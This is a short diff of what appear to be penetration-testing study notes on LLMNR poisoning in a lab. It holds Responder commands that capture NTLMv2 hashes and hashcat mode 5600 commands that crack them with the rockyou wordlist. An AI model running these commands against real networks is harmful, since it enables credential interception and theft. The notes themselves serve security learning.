@@ -17,9 +17,6 @@ I do, send me hash and I`ll connect
 python Responder.py -I tun0 -rdw (Laurent Gaffie - Responder - Inpacket)
 receive fcastle + password hash -> hashcat
 
-hashcat -m 5600 hashes.txt rockyou.txt
-
-
 morning or after lunch (traffic)
 
 VMs
@@ -30,5 +27,9 @@ Kali Bridge enps
 Kali?
 responder -I eth0 -rdwv
 
+/usr/share/wordlists/rockyou.txt
+
+hashcat --help | grep NTLM
+hashcat -m 5600 hashes.txt rockyou.txt
 
 
